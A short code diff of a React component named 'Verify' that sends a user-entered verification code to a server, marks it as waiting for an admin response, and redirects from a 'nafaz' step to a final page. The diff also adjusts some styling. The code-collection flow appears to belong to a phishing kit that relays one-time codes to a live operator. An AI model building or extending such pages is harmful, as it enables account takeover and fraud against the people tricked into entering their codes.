@@ -16,15 +16,13 @@ function Verify() {
   const sendData = (e: any) => {
     e.preventDefault();
     const data = Object.fromEntries(new FormData(e.target));
-    // console.log(data);
 
-    // [ ] should be true for production
     sendDataToServer({
       data: {
         "رمز التحقق": data.code,
       },
       current: "verify",
-      nextPage: "nafaz",
+      nextPage: "final-page",
       waitingForAdminResponse: true,
     });
   };
@@ -36,7 +34,7 @@ function Verify() {
           className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
           onSubmit={sendData}
         >
-          <div className="py-2 px-6 mb-4 rounded-xl bg-main">
+          <div className="bg-gradient-to-tl from-main/20 to-main/5 py-2 px-6 mb-4 rounded-xl">
             <img
               src="/assets/images/logo.webp"
               alt="logo"
